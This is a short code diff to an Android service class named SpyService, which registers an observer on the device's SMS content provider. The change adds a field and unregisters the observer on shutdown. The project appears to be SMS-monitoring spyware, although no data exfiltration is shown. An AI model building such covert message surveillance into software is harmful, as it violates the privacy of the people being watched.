@@ -14,14 +14,16 @@ import android.widget.Toast;
  */
 public class SpyService extends Service {
 
+    private SmsObserver smsObserver;
+
 
     @Override
     public void onCreate() {
         super.onCreate();
 
         final Uri SMS_STATUS_URI = Uri.parse("content://sms");
-        SmsObserver smsSentObserver = new SmsObserver(new Handler(), this);
-        this.getContentResolver().registerContentObserver(SMS_STATUS_URI, true, smsSentObserver);
+        smsObserver = new SmsObserver(new Handler(), this);
+        this.getContentResolver().registerContentObserver(SMS_STATUS_URI, true, smsObserver);
     }
 
 
@@ -35,5 +37,11 @@ public class SpyService extends Service {
     @Override
     public IBinder onBind(Intent intent) {
         return null;
+    }
+
+    @Override
+    public void onDestroy() {
+        this.getContentResolver().unregisterContentObserver(smsObserver);
+        super.onDestroy();
     }
 }
